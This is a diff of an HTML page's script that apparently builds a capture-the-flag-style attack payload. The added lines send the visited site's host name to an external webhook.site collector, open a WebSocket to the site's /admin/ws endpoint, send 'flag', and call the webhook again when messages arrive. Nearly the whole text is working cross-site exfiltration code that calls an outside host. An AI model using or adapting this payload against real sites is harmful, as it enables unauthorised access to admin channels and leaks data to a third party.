@@ -7,8 +7,24 @@
       fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
         method: `POST`,
         mode: `no-cors`,
-        body: `salam1`
+        body: `${window.location.host}`
       });
+    
+      const ws = new WebSocket(`ws://${window.location.host}/admin/ws`);
+    
+      ws.onopen = () => {
+        fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
+          method: `POST`,
+          mode: `no-cors`,
+          body: `ws opened successfully`
+        });
+        ws.send("flag");
+      }
+    
+      ws.onmessage = (event) => {
+        fetch("https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6");
+      };
+    
   </script>
 </body>
 </html>
